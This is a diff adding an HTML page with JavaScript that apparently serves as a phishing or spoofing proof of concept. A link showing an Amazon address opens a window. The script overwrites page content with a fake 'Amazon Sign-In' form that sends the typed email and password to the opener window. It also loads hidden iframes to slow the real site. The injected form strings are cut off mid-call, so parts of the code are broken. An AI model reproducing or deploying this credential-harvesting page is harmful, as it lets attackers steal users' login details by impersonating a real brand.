@@ -1,0 +1,75 @@
+<body>
+  <a id=test href="https://www.amazon.com/" onclick=foo()>https://www.amazon.com/</a>
+  </body>
+  
+  <script>
+  
+  var w;
+  var t;
+  var z;
+  
+  if(location.href.indexOf("fake") !== -1){
+  document.body.innerHTML = "<\!DOCTYPE html><html><head><title>Amazon Sign-In</title><style>body { font-family: Arial, sans-serif; padding: 20px; }.login-form { max-width: 300px; margin: 0 auto; }input { width: 100%; padding: 10px; margin: 5px 0; }button { width: 100%; padding: 10px; background: #FF9900; border: none; }</style></head><body><div class=\"login-form\"><h2>Amazon Sign-In</h2><form id=\"loginForm\"><input type=\"email\" id=\"email\" placeholder=\"Email or mobile number\"><input type=\"password\" id=\"password\" placeholder=\"Password\"><button type=\"submit\">Sign in</button></form></div><script>document.getElementById(\"loginForm\").onsubmit=function(e){e.preventDefault();const email=document.getElementById(\"email\").value;const password=document.getElementById(\"password\").value;window.opener.postMessage({type:\"credentials\",email:email,password:password},\"*\"";
+  }
+  
+  
+  function foo(){
+  
+  document.getElementById("test").href="#";
+  
+  w = window.open("?fake");
+  
+  t = setInterval('bar()',1);
+  
+  }
+  
+  function bar(){
+  
+  if(w.location.href !== 'about:blank'){
+  
+  alert("Redirecting");
+  
+  document.body.innerHTML = "<\!DOCTYPE html><html><head><title>Amazon Sign-In</title><style>body { font-family: Arial, sans-serif; padding: 20px; }.login-form { max-width: 300px; margin: 0 auto; }input { width: 100%; padding: 10px; margin: 5px 0; }button { width: 100%; padding: 10px; background: #FF9900; border: none; }</style></head><body><div class=\"login-form\"><h2>Amazon Sign-In</h2><form id=\"loginForm\"><input type=\"email\" id=\"email\" placeholder=\"Email or mobile number\"><input type=\"password\" id=\"password\" placeholder=\"Password\"><button type=\"submit\">Sign in</button></form></div><script>document.getElementById(\"loginForm\").onsubmit=function(e){e.preventDefault();const email=document.getElementById(\"email\").value;const password=document.getElementById(\"password\").value;window.opener.postMessage({type:\"credentials\",email:email,password:password},\"*\"";
+  
+  slow();
+  
+  w.location.href = 'https://www.amazon.com/';
+  
+  clearInterval(t);
+  
+  z = setInterval('baz()',1);
+  
+  }
+  
+  }
+  
+  function baz(){
+  try{
+  w.location.href !== 'about:blank';
+  }
+  catch (e){
+  
+  //stop page loading
+  w.location.href='https://www.google.com/csi';
+  clearInterval(z);
+  
+  //Make sure the old content is not cleared
+  setTimeout("alert('ok');window.location.href='about:blank';window.close();", 3000);
+  }
+  
+  }
+  
+  
+  //slow down the website
+  function slow() {
+  for (i=0; i<10; i++ ) {
+  
+  iframe = document.createElement("iframe");
+  iframe.src = 'https://www.amazon.com/';
+  iframe.style = 'display:none';
+  document.body.appendChild(iframe);
+  
+  }
+  }
+  
+  </script>
